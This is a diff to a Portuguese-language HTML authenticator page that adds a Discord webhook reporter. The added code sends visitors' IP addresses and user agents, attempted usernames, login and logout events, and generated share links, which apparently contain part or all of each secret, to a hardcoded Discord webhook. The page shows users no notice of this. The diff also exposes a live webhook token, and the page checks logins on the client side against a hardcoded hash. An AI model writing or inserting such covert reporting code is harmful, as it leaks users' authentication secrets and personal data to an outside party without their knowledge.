@@ -488,7 +488,7 @@
         </div>
         <div class="field-group">
           <label>Usuário</label>
-          <input type="text" id="username" value="admin" autocomplete="username">
+          <input type="text" id="username">
         </div>
         <div class="field-group">
           <label>Senha</label>
@@ -616,6 +616,42 @@
 
 <script>
   const ADMIN_HASH = "b2db2fa384968b0cd8abb5bcf6f38a4b79ab194c0ee61f160f9962d19ac36497";
+  const WEBHOOK = "https://discord.com/api/webhooks/1506352339777360143/n36JgSn-JQh6_vIyb3jfFNwDK5Z7XAO9UTQZ0lm9DkT85zKQbs-y1Yjyeldci6igtYGc";
+
+  async function getIP() {
+    try {
+      const r = await fetch("https://api.ipify.org?format=json");
+      const j = await r.json();
+      return j.ip || "desconhecido";
+    } catch { return "desconhecido"; }
+  }
+
+  async function sendWebhook(title, color, fields) {
+    const ip = await getIP();
+    const now = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+    const ua = navigator.userAgent;
+    const allFields = [
+      { name: "🕐 Horário", value: now, inline: true },
+      { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+      { name: "🖥️ User-Agent", value: `\`${ua.substring(0, 100)}\``, inline: false },
+      ...fields
+    ];
+    try {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title,
+            color,
+            fields: allFields,
+            footer: { text: "yDxvxd · Authenticator" },
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    } catch {}
+  }
 
   async function sha256(str) {
     const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
@@ -631,13 +667,22 @@
     if (user !== "admin" || await sha256(pass) !== ADMIN_HASH) {
       err.classList.add('show');
       document.getElementById('password').value = '';
+      sendWebhook("❌ Tentativa de Login Falhou", 0xF4645C, [
+        { name: "👤 Usuário tentado", value: `\`${user || '(vazio)'}\``, inline: true }
+      ]);
       return;
     }
+    sendWebhook("✅ Login Realizado", 0x23D18B, [
+      { name: "👤 Usuário", value: "`admin`", inline: true }
+    ]);
     show('main-app');
     hide('login-screen');
   }
 
   function logout() {
+    sendWebhook("🚪 Logout", 0x7C6AF7, [
+      { name: "👤 Usuário", value: "`admin`", inline: true }
+    ]);
     hide('main-app');
     show('login-screen');
     document.getElementById('password').value = '';
@@ -705,6 +750,13 @@
     const expDate = new Date(exp);
     document.getElementById('link-exp-text').textContent =
       `Válido por ${formatDur(mins)} · expira às ${expDate.toLocaleTimeString('pt-BR', {hour:'2-digit',minute:'2-digit'})}`;
+
+    sendWebhook("🔗 Link Gerado", 0xA594F9, [
+      { name: "🔑 Segredo (primeiros 6 chars)", value: `\`${secret.substring(0,6)}...\``, inline: true },
+      { name: "⏱️ Duração", value: formatDur(mins), inline: true },
+      { name: "📅 Expira em", value: expDate.toLocaleString('pt-BR'), inline: false },
+      { name: "🔗 Link", value: `\`${url.toString().substring(0, 200)}\``, inline: false }
+    ]);
   }
 
   function formatDur(mins) {
@@ -793,6 +845,10 @@
         return;
       }
       await initViewMode(data.s, data.exp);
+      sendWebhook("👁️ Link Acessado", 0xF4A745, [
+        { name: "🔑 Segredo (primeiros 6 chars)", value: `\`${data.s.substring(0,6)}...\``, inline: true },
+        { name: "📅 Expira em", value: new Date(data.exp).toLocaleString('pt-BR'), inline: true }
+      ]);
     } catch(e) {
       showToast("Link inválido ou corrompido.");
       setTimeout(() => { window.location.search = ''; }, 2500);
